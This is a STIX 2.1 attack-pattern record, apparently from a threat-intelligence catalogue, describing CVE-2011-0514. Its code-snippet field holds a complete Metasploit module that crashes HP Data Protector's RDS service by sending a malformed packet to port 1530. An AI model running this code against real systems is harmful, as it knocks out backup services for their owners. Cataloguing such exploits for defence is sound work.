{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b806503-1bc2-4819-b4a3-a77342e16c4f",
    "created": "2024-08-14T16:25:03.864388Z",
    "modified": "2024-08-14T16:25:03.864392Z",
    "name": "HP Data Protector Manager RDS DOS",
    "description": " This module causes a remote DOS on HP Data Protector's RDS service.  By sending a malformed packet to port 1530, _rm32.dll causes RDS to crash due to an enormous size for malloc(). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/hp/data_protector_rds.rb",
            "external_id": "data_protector_rds.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0514"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HP Data Protector Manager RDS DOS',\n      'Description' => %q{\n          This module causes a remote DOS on HP Data Protector's RDS service.  By sending\n        a malformed packet to port 1530, _rm32.dll causes RDS to crash due to an enormous\n        size for malloc().\n      },\n      'Author'      =>\n        [\n          'Roi Mallo <rmallof[at]gmail.com>',  #initial discovery, poc\n          'sinn3r',                            #msf\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2011-0514' ],\n          [ 'OSVDB', '70617' ],\n          [ 'EDB', '15940' ],\n        ],\n      'DisclosureDate' => '2011-01-08' ))\n\n    register_options([\n      Opt::RPORT(1530),\n    ])\n  end\n\n  def run\n    buf  = \"\\x23\\x8c\\x29\\xb6\"  #Header\n    buf << \"\\x64\\x00\\x00\\x00\"  #Packet size\n    buf << \"\\x41\"*4            #Data\n\n    connect\n    print_status(\"Sending malformed packet...\")\n    sock.put(buf)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-08 "
}